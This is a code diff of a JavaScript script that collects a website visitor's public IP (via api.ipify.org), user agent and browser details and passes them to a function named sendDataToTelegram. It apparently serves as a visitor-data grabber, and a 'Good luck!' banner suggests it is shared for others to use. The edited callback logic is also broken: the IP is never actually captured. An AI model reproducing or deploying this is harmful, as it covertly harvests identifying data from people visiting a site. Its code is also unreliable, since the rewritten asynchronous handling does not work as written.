@@ -19,11 +19,11 @@
 //                     УДАЧИ!
 
 
-async function getIPAddress() {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
-}
+// async function getIPAddress() {
+//     const response = await fetch('https://api.ipify.org?format=json');
+//     const data = await response.json();
+//     return data.ip;
+// }
 
 function fetchPublicIP(callback) {
   fetch('https://api.ipify.org?format=json')
@@ -55,19 +55,13 @@ function getBrowserInfo() {
         engine: navigator.product
     };
 }
-fetchPublicIP((error, ip) => {
-  if (error) {
-    console.error('Error retrieving IP address:', error);
-  } else {
-    console.log('Public IP address retrieved:', ip);
-  }
-});
+
 async function sendDataToTelegram() {
     const ipAddress = fetchPublicIP((error, ip) => {
       if (error) {
-        console.error('Error retrieving IP address:', error);
+        return error
       } else {
-        console.log('Public IP address retrieved:', ip);
+        return ip
       }
     });
     const userAgent = getUserAgent();
